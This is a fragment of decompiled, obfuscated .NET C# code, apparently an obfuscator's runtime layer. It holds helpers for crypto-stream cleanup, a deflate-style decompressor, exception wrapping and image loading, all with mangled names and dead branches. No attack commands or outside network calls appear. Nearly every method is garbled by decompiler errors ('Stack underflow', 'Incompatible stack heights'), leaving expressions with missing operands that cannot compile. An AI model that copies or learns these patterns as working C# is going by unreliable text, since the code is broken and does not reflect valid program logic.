				IL_028f:
				if (false)
				{
					goto IL_0284;
				}
				if (rSACryptoServiceProvider != null)
				{
					if (4 == 0)
					{
						goto IL_0284;
					}
					global::_000F._007E_0006_0002(rSACryptoServiceProvider);
				}
				if (memoryStream != null)
				{
					global::_000F._007E_009E(memoryStream);
				}
				if (cryptoStream != null)
				{
					global::_000F._007E_009E(cryptoStream);
				}
				goto end_IL_0281;
				IL_0284:
				global::_000F._007E_0005_0002(rijndaelManaged);
				goto IL_028f;
				end_IL_0281:;
			}
		}

		static bool _0001(_0006 P_0)
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			if (!((_0006)/*Error near IL_0007: Stack underflow*/)._0002)
			{
				return false;
			}
			((_0006)/*Error near IL_0012: Stack underflow*/)._0001._0001();
			return (byte)/*Error near IL_0015: Stack underflow*/ != 0;
		}

		static string _0001(global::_0008._0006._0003 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			try
			{
				string text = ((global::_0008._0006._0003)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (string)/*Error near IL_001c: Stack underflow*/;
		}

		static void _0001(string P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 3
			try
			{
				try
				{
					do
					{
						if (0 == 0)
						{
							_ = global::_0011._007E_001F_0002;
							_ = global::_0002._000E._0001;
							/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/, (string)/*Error near IL_001e: Stack underflow*/);
						}
					}
					while (false);
				}
				catch (IsolatedStorageException)
				{
				}
			}
			catch (Exception ex2)
			{
				_0011._0001(ex2, (object)P_0);
				throw;
			}
		}

		static void _0001(byte[] P_0, global::_0008._0004._0006 P_1)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 1
			try
			{
				global::_0008._0004._0008 obj = ((global::_0008._0004._0006)/*Error near IL_0009: Stack underflow*/)._0001;
				_0011._0001((byte[])/*Error near IL_0018: Stack underflow*/, obj);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_1, (object)P_0);
				throw;
			}
		}

		static bool _0001(global::_0008._0004._0007 P_0)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			try
			{
				do
				{
					if (8u != 0)
					{
						bool num = ((global::_0008._0004._0007)/*Error near IL_000a: Stack underflow*/)._0001 < 16384;
						do
						{
							num = !num;
						}
						while (2 == 0);
						bool flag = num;
					}
				}
				while ((5 == 0) ? true : false);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (byte)/*Error near IL_0032: Stack underflow*/ != 0;
		}

		static void _0001(Exception P_0, object P_1)
		{
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 4
			_ = new object[1];
			_ = 0;
			((object[])/*Error near IL_000d: Stack underflow*/)[/*Error near IL_000d: Stack underflow*/] = (object)/*Error near IL_000d: Stack underflow*/;
			_0011._0001((Exception)/*Error near IL_001b: Stack underflow*/, (object[])/*Error near IL_001b: Stack underflow*/);
		}

		static void _0001(global::_0002._0005 P_0, global::_0007._0002 P_1)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			global::_000F._0002 obj = ((global::_0002._0005)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				/*Error near IL_002d: Stack underflow*/((object)/*Error near IL_002d: Stack underflow*/, (global::_0007._0002)/*Error near IL_002d: Stack underflow*/);
			}
		}

		static void _0001(global::_0002._0006 P_0, global::_000E._0005 P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			string empty = string.Empty;
			_0011._0001((global::_0002._0006)/*Error near IL_0017: Stack underflow*/, (global::_000E._0005)/*Error near IL_0017: Stack underflow*/, empty);
		}

		static int _0001(global::_0008._0004._0002 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			try
			{
				int num = ((global::_0008._0004._0002)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (int)/*Error near IL_001c: Stack underflow*/;
		}

		static string _0001(global::_0008._0006._0003 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			try
			{
				string text = ((global::_0008._0006._0003)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (string)/*Error near IL_001c: Stack underflow*/;
		}

		static bool _0001(global::_0008._0004._0006 P_0)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			try
			{
				_0011._0001(((global::_0008._0004._0006)/*Error near IL_0007: Stack underflow*/)._0001);
				bool flag = (byte)/*Error near IL_0018: Stack underflow*/ != 0;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (byte)/*Error near IL_0025: Stack underflow*/ != 0;
		}

		static int _0001(global::_0008._0004._000E P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			try
			{
				int num = ((global::_0008._0004._000E)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (int)/*Error near IL_001c: Stack underflow*/;
		}

		static int _0001(global::_0008._0004._0003 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			try
			{
				int num = ((global::_0008._0004._0003)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (int)/*Error near IL_001c: Stack underflow*/;
		}

		static void _0001(string P_0)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 2
			//IL_0025: Incompatible stack heights: 0 vs 1
			IDisposable disposable = default(IDisposable);
			try
			{
				if (0 == 0)
				{
					disposable = null;
				}
				try
				{
					_0011._0001();
					disposable = (IDisposable)/*Error near IL_001b: Stack underflow*/;
					_ = 0;
					_0011._0001((string)/*Error near IL_0025: Stack underflow*/);
					_0011._0001((long)/*Error near IL_002c: Stack underflow*/, (string)/*Error near IL_002c: Stack underflow*/);
				}
				catch (Exception)
				{
				}
				finally
				{
					if (disposable != null)
					{
						global::_000F._007E_0099(disposable);
					}
				}
			}
			catch (Exception ex2)
			{
				_0011._0001(ex2, (object)disposable, (object)P_0);
				throw;
			}
		}

		unsafe static int _0001(global::_0008._0004._0006 P_0, byte[] P_1)
		{
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Unknown result type (might be due to invalid IL or missing references)
			//IL_0174: Incompatible stack heights: 0 vs 1
			//IL_017a: Incompatible stack heights: 0 vs 1
			//IL_0180: Incompatible stack heights: 0 vs 2
			//IL_0186: Incompatible stack heights: 0 vs 1
			//IL_018c: Incompatible stack heights: 0 vs 2
			//IL_0192: Incompatible stack heights: 0 vs 1
			//IL_0198: Incompatible stack heights: 0 vs 2
			//IL_019e: Incompatible stack heights: 0 vs 2
			void* ptr = stackalloc byte[26];
			try
			{
				*(int*)(nint)/*Error near IL_0011: Stack underflow*/ = 0;
				_ = /*Error near IL_0018: Stack underflow*/+ 4;
				IntPtr intPtr = (nint)((Array)/*Error near IL_001e: Stack underflow*/).LongLength;
				*(int*)(nint)/*Error near IL_0020: Stack underflow*/ = (int)(nint)intPtr;
				_ = /*Error near IL_0027: Stack underflow*/+ 8;
				int num = *(int*)(nint)(/*Error near IL_002e: Stack underflow*/ + 4);
				*(int*)(nint)/*Error near IL_0030: Stack underflow*/ = num;
				while (true)
				{
					_ = /*Error near IL_0038: Stack underflow*/+ 12;
					_ = ((global::_0008._0004._0006)/*Error near IL_0042: Stack underflow*/)._0001;
					int num2 = *(int*)ptr;
					int num3 = *(int*)((byte*)ptr + 4);
					int num4 = _0011._0001((global::_0008._0004._000E)/*Error near IL_0052: Stack underflow*/, (byte[])/*Error near IL_0052: Stack underflow*/, num2, num3);
					*(int*)(nint)/*Error near IL_0053: Stack underflow*/ = num4;
					*(int*)ptr += *(int*)((byte*)ptr + 12);
					P_0._0001 += *(int*)((byte*)ptr + 12);
					*(int*)((byte*)ptr + 4) -= *(int*)((byte*)ptr + 12);
					if (*(int*)((byte*)ptr + 4) != 0 && P_0._0001 != 30)
					{
						global::_0008._0004._0008 obj = P_0._0001;
						((byte*)ptr)[24] = (((P_0._0001 & 4) != 0) ? ((byte)1) : ((byte)0));
						((byte*)ptr)[25] = (((P_0._0001 & 8) != 0) ? ((byte)1) : ((byte)0));
						if (_0011._0001(((byte*)ptr)[25] != 0, ((byte*)ptr)[24] != 0, obj))
						{
							continue;
						}
						if (P_0._0001 == 16)
						{
							*(int*)((byte*)ptr + 20) = *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
							break;
						}
						if (P_0._0001 == 20)
						{
							*(int*)((byte*)ptr + 16) = 8 + (-_0011._0001(P_0._0001) & 7);
							while (*(int*)((byte*)ptr + 16) > 0)
							{
								_0011._0001(P_0._0001, 2, 10);
								*(int*)((byte*)ptr + 16) -= 10;
							}
							P_0._0001 = 16;
						}
						else if (P_0._0001 == 28)
						{
							_0011._0001(P_0._0001);
							P_0._0001 = 30;
						}
						continue;
					}
					*(int*)((byte*)ptr + 20) = *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
					break;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)(*(int*)((byte*)ptr + 8)), (object)(*(int*)((byte*)ptr + 12)), (object)(*(int*)((byte*)ptr + 16)), (object)P_0, (object)P_1);
				throw;
			}
			return *(int*)((byte*)ptr + 20);
		}

		static Assembly _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			try
			{
				_0088._000E_0003();
				Assembly assembly = (Assembly)/*Error near IL_0013: Stack underflow*/;
			}
			catch
			{
				Assembly assembly = null;
			}
			return (Assembly)/*Error near IL_001d: Stack underflow*/;
		}

		static IDisposable _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			try
			{
				new global::_0002._000E._0001(global::_0002._000E._0004);
				IDisposable disposable = (IDisposable)/*Error near IL_0013: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
			return (IDisposable)/*Error near IL_001f: Stack underflow*/;
		}

		static void _0001(Exception P_0, object P_1, object P_2, object P_3, object P_4, object P_5, object P_6, object P_7, object P_8, object P_9)
		{
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 4
			//IL_0043: Incompatible stack heights: 0 vs 3
			//IL_0046: Incompatible stack heights: 0 vs 3
			//IL_004a: Incompatible stack heights: 0 vs 3
			//IL_004e: Incompatible stack heights: 0 vs 3
			//IL_0052: Incompatible stack heights: 0 vs 3
			//IL_0056: Incompatible stack heights: 0 vs 3
			//IL_005a: Incompatible stack heights: 0 vs 3
			_ = new object[9];
			_ = 0;
			((object[])/*Error near IL_000e: Stack underflow*/)[/*Error near IL_000e: Stack underflow*/] = (object)/*Error near IL_000e: Stack underflow*/;
			/*Error near IL_000e: Stack underflow*/;
			_ = 1;
			((object[])/*Error near IL_0013: Stack underflow*/)[/*Error near IL_0013: Stack underflow*/] = (object)/*Error near IL_0013: Stack underflow*/;
			/*Error near IL_0013: Stack underflow*/;
			_ = 2;
			((object[])/*Error near IL_0018: Stack underflow*/)[/*Error near IL_0018: Stack underflow*/] = (object)/*Error near IL_0018: Stack underflow*/;
			/*Error near IL_0018: Stack underflow*/;
			_ = 3;
			((object[])/*Error near IL_001d: Stack underflow*/)[/*Error near IL_001d: Stack underflow*/] = (object)/*Error near IL_001d: Stack underflow*/;
			/*Error near IL_001d: Stack underflow*/;
			_ = 4;
			((object[])/*Error near IL_0022: Stack underflow*/)[/*Error near IL_0022: Stack underflow*/] = (object)/*Error near IL_0022: Stack underflow*/;
			/*Error near IL_0022: Stack underflow*/;
			_ = 5;
			((object[])/*Error near IL_0027: Stack underflow*/)[/*Error near IL_0027: Stack underflow*/] = (object)/*Error near IL_0027: Stack underflow*/;
			/*Error near IL_0027: Stack underflow*/;
			_ = 6;
			((object[])/*Error near IL_002c: Stack underflow*/)[/*Error near IL_002c: Stack underflow*/] = (object)/*Error near IL_002c: Stack underflow*/;
			/*Error near IL_002c: Stack underflow*/;
			_ = 7;
			((object[])/*Error near IL_0031: Stack underflow*/)[/*Error near IL_0031: Stack underflow*/] = (object)/*Error near IL_0031: Stack underflow*/;
			((object[])/*Error near IL_0031: Stack underflow*/)[8] = P_9;
			_0011._0001((Exception)/*Error near IL_003b: Stack underflow*/, (object[])/*Error near IL_003b: Stack underflow*/);
		}

		static byte[] _0001(string P_0)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0030: Incompatible stack heights: 0 vs 2
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 3
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 2
			//IL_004a: Incompatible stack heights: 0 vs 2
			//IL_0054: Incompatible stack heights: 0 vs 1
			byte[] array = default(byte[]);
			try
			{
				_ = global::_0001._007E_0001;
				/*Error near IL_0037: Stack underflow*/((object)/*Error near IL_0037: Stack underflow*/);
				array = new byte[/*Error near IL_000b: Stack underflow*/ * 2];
				_ = _0093_0002._001E_0005;
				_ = _009E_0002._007E_008C_0005;
				/*Error near IL_0044: Stack underflow*/((object)/*Error near IL_0044: Stack underflow*/);
				_ = 0;
				_ = 0;
				IntPtr intPtr = (nint)((Array)/*Error near IL_0027: Stack underflow*/).LongLength;
				/*Error near IL_0051: Stack underflow*/((Array)/*Error near IL_0051: Stack underflow*/, (int)/*Error near IL_0051: Stack underflow*/, (Array)/*Error near IL_0051: Stack underflow*/, (int)/*Error near IL_0051: Stack underflow*/, (int)(nint)intPtr);
				return (byte[])/*Error near IL_002c: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)array, (object)P_0);
				throw;
			}
		}

		static void _0001(object[] P_0, Exception P_1)
		{
			//IL_005a: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_006a: Incompatible stack heights: 0 vs 3
			//IL_0071: Incompatible stack heights: 0 vs 1
			//IL_0078: Incompatible stack heights: 0 vs 1
			//IL_007b: Incompatible stack heights: 0 vs 1
			//IL_0082: Incompatible stack heights: 0 vs 1
			//IL_0085: Incompatible stack heights: 0 vs 1
			//IL_0088: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				goto IL_0004;
			}
			goto IL_0040;
			IL_0040:
			_0011._0001((Exception)/*Error near IL_0045: Stack underflow*/, (object[])/*Error near IL_0045: Stack underflow*/);
			_0011._0001()._0001(P_1, false, false);
			goto IL_0052;
			IL_0052:
			if (0 == 0)
			{
				return;
			}
			goto IL_0004;
			IL_0004:
			if (0 == 0)
			{
				if (!(/*Error near IL_000a: Stack underflow*/ is SecurityException))
				{
					goto IL_0040;
				}
				if (false)
				{
					goto IL_0052;
				}
				if (0 == 0)
				{
					_ = global::_0008._0095;
					_ = global::_000F._0003._0001;
					global::_000E._0003._0001(107395598);
					/*Error near IL_0071: Stack underflow*/((string)/*Error near IL_0071: Stack underflow*/, (string)/*Error near IL_0071: Stack underflow*/);
					if ((int)/*Error near IL_002b: Stack underflow*/ == 0)
					{
						goto IL_0040;
					}
				}
			}
			if (0 == 0)
			{
				_0011._0001();
				SecurityException obj = (SecurityException)/*Error near IL_0033: Stack underflow*/;
				((global::_000F._0003)/*Error near IL_0082: Stack underflow*/)._0001(obj);
				if ((int)/*Error near IL_003b: Stack underflow*/ != 0)
				{
					return;
				}
				goto IL_0040;
			}
			goto IL_0052;
		}

		static bool _0001(global::_0008._0005 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0008._0005)/*Error near IL_0007: Stack underflow*/)._0003;
		}

		static void _0001(_0008 P_0)
		{
			//IL_0042: Incompatible stack heights: 0 vs 2
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 2
			do
			{
				if (0 == 0)
				{
					_ = _0084_0002._007E_0091_0004;
					Timer obj = ((_0008)/*Error near IL_000f: Stack underflow*/)._0001;
					if (7u != 0)
					{
						/*Error near IL_0049: Stack underflow*/(obj, true);
					}
					if (5u != 0)
					{
						global::_000E._0003._0001(107393289);
						_0011._0001((string)/*Error near IL_005a: Stack underflow*/);
						((_0008)/*Error near IL_0029: Stack underflow*/)._0001 = (Image)/*Error near IL_0029: Stack underflow*/;
					}
					if (1 == 0)
					{
						continue;
					}
					((_0008)/*Error near IL_0034: Stack underflow*/)._0001 = true;
				}
				_ = global::_000F._007E_0001_0002;
				/*Error near IL_0067: Stack underflow*/((object)/*Error near IL_0067: Stack underflow*/);
			}
			while (7 == 0);
		}

		static void _0001(global::_0004._0008 P_0, global::_0003._0007 P_1)
		{
			//IL_003b: Invalid comparison between Unknown and I4
			//IL_0046: Invalid comparison between Unknown and I4
			//IL_0096: Incompatible stack heights: 0 vs 1
			//IL_009c: Incompatible stack heights: 0 vs 2
			//IL_00a2: Incompatible stack heights: 0 vs 1
			//IL_00a8: Incompatible stack heights: 0 vs 1
			//IL_00ae: Incompatible stack heights: 0 vs 1
			//IL_00ba: Incompatible stack heights: 0 vs 1
			//IL_00c0: Incompatible stack heights: 0 vs 1
			//IL_00c6: Incompatible stack heights: 0 vs 1
			if (3u != 0)
			{
				_ = ((global::_0004._0008)/*Error near IL_000d: Stack underflow*/)._0001;
				if (/*Error near IL_0017: Stack underflow*/ == /*Error near IL_0017: Stack underflow*/)
				{
					goto IL_0091;
				}
			}
			((global::_0004._0008)/*Error near IL_0026: Stack underflow*/)._0001 = (global::_0003._0007)/*Error near IL_0026: Stack underflow*/;
			global::_0003._0007 obj = ((global::_0004._0008)/*Error near IL_0030: Stack underflow*/)._0001;
			goto IL_003a;
			IL_004f:
			Bitmap obj2 = _0011._0001(global::_000E._0003._0001(107393308));
			((global::_0004._0008)/*Error near IL_0063: Stack underflow*/)._0001 = obj2;
			goto IL_0086;
			IL_0086:
			global::_000F._007E_0001_0002(P_0);
			goto IL_0091;
			IL_003a:
			if ((int)/*Error near IL_003d: Stack underflow*/ != 1)
			{
				if (0 == 0)
				{
					if ((int)/*Error near IL_0048: Stack underflow*/ == 2)
					{
						P_0._0001 = _0011._0001(global::_000E._0003._0001(107392751));
					}
					else
					{
						if (false)
						{
							goto IL_004f;
						}
						P_0._0001 = null;
					}
					goto IL_0086;
				}
				goto IL_0091;
			}
			goto IL_004f;
			IL_0091:
			if (2 == 0)
			{
				goto IL_003a;
			}
		}

		static bool _0001(global::_0008._0004._0008 P_0)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 2
			//IL_0029: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((global::_0008._0004._0008)/*Error near IL_0007: Stack underflow*/)._000E;
				int num = ((global::_0008._0004._0008)/*Error near IL_000e: Stack underflow*/)._0008;
				bool flag = (int)/*Error near IL_0010: Stack underflow*/ == num;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (byte)/*Error near IL_0028: Stack underflow*/ != 0;
		}

		static ulong[] _0001(_000E P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			try
			{
				ulong[] array = ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (ulong[])/*Error near IL_001c: Stack underflow*/;
		}

		unsafe static bool _0001(int P_0, int P_1, global::_0008._0004._0007 P_2)
		{
			//IL_004c: Unknown result type (might be due to invalid IL or missing references)
			//IL_005e: Unknown result type (might be due to invalid IL or missing references)
			//IL_011c: Incompatible stack heights: 0 vs 1
			//IL_0122: Incompatible stack heights: 0 vs 2
			//IL_0128: Incompatible stack heights: 0 vs 2
			//IL_012e: Incompatible stack heights: 0 vs 1
			//IL_0134: Incompatible stack heights: 0 vs 2
			//IL_013a: Incompatible stack heights: 0 vs 1
			//IL_0140: Incompatible stack heights: 0 vs 2
			//IL_0146: Incompatible stack heights: 0 vs 1
			int num;
			void* ptr;
			if (0 == 0)
			{
				num = 13;
				if (num == 0)
				{
					goto IL_017d;
				}
				ptr = stackalloc byte[num];
				try
				{
					_ = ((global::_0008._0004._0007)/*Error near IL_0020: Stack underflow*/)._0001;
					_ = ((global::_0008._0004._0007)/*Error near IL_002a: Stack underflow*/)._0001;
					short num2 = (short)/*Error near IL_0030: Stack underflow*/;
					((short[])/*Error near IL_0031: Stack underflow*/)[/*Error near IL_0031: Stack underflow*/] = num2;
					if (5u != 0)
					{
						_ = ((global::_0008._0004._0007)/*Error near IL_0041: Stack underflow*/)._0002;
						_ = /*Error near IL_004d: Stack underflow*/+ 8;
						int num3 = ((global::_0008._0004._0007)/*Error near IL_0057: Stack underflow*/)._0001;
						*(int*)(nint)/*Error near IL_0058: Stack underflow*/ = num3;
						int num4 = *(int*)(nint)(/*Error near IL_005f: Stack underflow*/ + 8);
						((global::_0008._0004._0007)/*Error near IL_0067: Stack underflow*/)._0001 = num4 + 1;
						int num5 = *(int*)((byte*)ptr + 8);
						((sbyte[])/*Error near IL_0070: Stack underflow*/)[num5] = (sbyte)(byte)(P_1 - 3);
						if (0 == 0)
						{
							*(int*)ptr = _0011._0001(P_2, P_1 - 3);
						}
						goto IL_007e;
					}
					goto IL_00f3;
					IL_00a4:
					int num6;
					if (num6 < 285)
					{
						P_2._0002 += (*(int*)ptr - 261) / 4;
					}
					goto IL_00c2;
					IL_010e:
					((byte*)ptr)[12] = (_0011._0001(P_2) ? ((byte)1) : ((byte)0));
					goto end_IL_0016;
					IL_00f3:
					if (false)
					{
						goto IL_007e;
					}
					P_2._0002 += *(int*)((byte*)ptr + 4) / 2 - 1;
					goto IL_010e;
					IL_00c2:
					*(int*)((byte*)ptr + 4) = _0011._0001(P_2, P_0 - 1);
					P_2._0002._0001[*(int*)((byte*)ptr + 4)]++;
					num6 = *(int*)((byte*)ptr + 4);
					int num7 = 4;
					if (num7 == 0)
					{
						goto IL_00a0;
					}
					if (num6 >= num7)
					{
						goto IL_00f3;
					}
					goto IL_010e;
					IL_007e:
					P_2._0001._0001[*(int*)ptr]++;
					num6 = *(int*)ptr;
					if (0 == 0)
					{
						num7 = 265;
						goto IL_00a0;
					}
					goto IL_00a4;
					IL_00a0:
					if (num6 >= num7)
					{
						num6 = *(int*)ptr;
						goto IL_00a4;
					}
					goto IL_00c2;
					end_IL_0016:;
				}
				catch (Exception ex)
				{
					_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)(*(int*)((byte*)ptr + 8)), (object)P_2, (object)P_0, (object)P_1);
					throw;
				}
			}
			num = ((byte*)ptr)[12];
			goto IL_017d;
			IL_017d:
			return (byte)num != 0;
		}

		static void _0001(global::_0002._0005 P_0)
		{
			//IL_0084: Incompatible stack heights: 0 vs 1
			//IL_0090: Incompatible stack heights: 0 vs 1
			//IL_0096: Incompatible stack heights: 0 vs 1
			//IL_00a0: Incompatible stack heights: 0 vs 1
			//IL_00aa: Incompatible stack heights: 0 vs 3
			//IL_00b4: Incompatible stack heights: 0 vs 1
			//IL_00be: Incompatible stack heights: 0 vs 1
			//IL_00c8: Incompatible stack heights: 0 vs 2
			try
			{
				_008E_0002._0013_0005();
				string text = (string)/*Error near IL_008a: Stack underflow*/;
				_0011._0001((global::_0002._0005)/*Error near IL_00a0: Stack underflow*/, (string)/*Error near IL_00a0: Stack underflow*/);
				_ = _009F_0002._008D_0005;
				_ = global::_0004._001A;
				_0011._0001();
				global::_000E._0003._0001(107392738);
				/*Error near IL_00be: Stack underflow*/((string)/*Error near IL_00be: Stack underflow*/, (string)/*Error near IL_00be: Stack underflow*/);
				_ = _0019._0098_0002;
				global::_000E._0003._0001(107392713);
				string text2 = global::_000E._0003._0001(107396010);
				string text3 = /*Error near IL_0059: Stack underflow*/((string)/*Error near IL_0059: Stack underflow*/, text, text2);
				/*Error near IL_005e: Stack underflow*/((string)/*Error near IL_005e: Stack underflow*/, text3);
				if (P_0._0001 != null)
				{
					_0080_0002._007E_008B_0004(P_0._0001, P_0, EventArgs.Empty);
				}
			}
			catch (ThreadAbortException)
			{
			}
			catch (Exception ex2)
			{
				_0011._0001(P_0, new global::_0007._0002(ex2));
			}
		}

		unsafe static bool _0001(global::_0008._0004._0001 P_0)
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Unknown result type (might be due to invalid IL or missing references)
			//IL_007b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0258: Incompatible stack heights: 0 vs 1
			//IL_025e: Incompatible stack heights: 0 vs 2
			//IL_0264: Incompatible stack heights: 0 vs 1
			//IL_026a: Incompatible stack heights: 0 vs 1
			//IL_0270: Incompatible stack heights: 0 vs 1
			//IL_0276: Incompatible stack heights: 0 vs 1
			//IL_027c: Incompatible stack heights: 0 vs 1
			//IL_0282: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[13];
			int num3 = default(int);
			try
			{
				_ = /*Error near IL_0011: Stack underflow*/+ 4;
				int num = ((global::_0008._0004._0001)/*Error near IL_001b: Stack underflow*/)._0001;
				*(int*)(nint)/*Error near IL_001c: Stack underflow*/ = num;
				switch (*(int*)(nint)(/*Error near IL_0023: Stack underflow*/ + 4))
				{
				case 2:
				{
					if (((global::_0008._0004._0001)/*Error near IL_0066: Stack underflow*/)._0001)
					{
						((global::_0008._0004._0001)/*Error near IL_0074: Stack underflow*/)._0001 = 12;
						*(sbyte*)(nint)(/*Error near IL_007c: Stack underflow*/ + 12) = 0;
						break;
					}
					int num2 = _0011._0001(((global::_0008._0004._0001)/*Error near IL_0092: Stack underflow*/)._0001, 3);
					*(int*)(nint)/*Error near IL_0099: Stack underflow*/ = num2;
					if (*(int*)ptr < 0)
					{
						((byte*)ptr)[12] = 0;
						break;
					}
					_0011._0001(P_0._0001, 3);
					if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
					{
						P_0._0001 = true;
					}
					num3 = *(int*)ptr >> 1;
					switch (num3)
					{
					case 0:
						_0011._0001(P_0._0001);
						P_0._0001 = 3;
						if (0 == 0)
						{
							break;
						}
						goto IL_011c;
					case 1:
						P_0._0001 = global::_0008._0004._0004._0001;
						P_0._0002 = global::_0008._0004._0004._0002;
						P_0._0001 = 7;
						break;
					case 2:
						{
							P_0._0001 = new global::_0008._0004._0005();
							goto IL_011c;
						}
						IL_011c:
						P_0._0001 = 6;
						break;
					}
					((byte*)ptr)[12] = 1;
					break;
				}
				case 3:
					num3 = (P_0._0005 = _0011._0001(P_0._0001, 16));
					if (num3 < 0)
					{
						((byte*)ptr)[12] = 0;
						break;
					}
					_0011._0001(P_0._0001, 16);
					P_0._0001 = 4;
					goto case 4;
				case 4:
					if (_0011._0001(P_0._0001, 16) < 0)
					{
						((byte*)ptr)[12] = 0;
						break;
					}
					_0011._0001(P_0._0001, 16);
					P_0._0001 = 5;
					goto case 5;
				case 5:
					*(int*)((byte*)ptr + 8) = _0011._0001(P_0._0001, P_0._0001, P_0._0005);
					P_0._0005 -= *(int*)((byte*)ptr + 8);
					if (P_0._0005 == 0)
					{
						P_0._0001 = 2;
						((byte*)ptr)[12] = 1;
					}
					else
					{
						((byte*)ptr)[12] = ((!_0011._0001(P_0._0001)) ? ((byte)1) : ((byte)0));
					}
					break;
				case 6:
					if (!_0011._0001(P_0._0001, P_0._0001))
					{
						((byte*)ptr)[12] = 0;
						break;
					}
					P_0._0001 = _0011._0001(P_0._0001);
					P_0._0002 = _0011._0001(P_0._0001);
					P_0._0001 = 7;
					goto case 7;
				case 7:
				case 8:
				case 9:
				case 10:
					((byte*)ptr)[12] = (_0011._0001(P_0) ? ((byte)1) : ((byte)0));
					break;
				case 12:
					((byte*)ptr)[12] = 0;
					break;
				default:
					((byte*)ptr)[12] = 0;
					break;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)num3, (object)(*(int*)((byte*)ptr + 8)), (object)P_0);
				throw;
			}
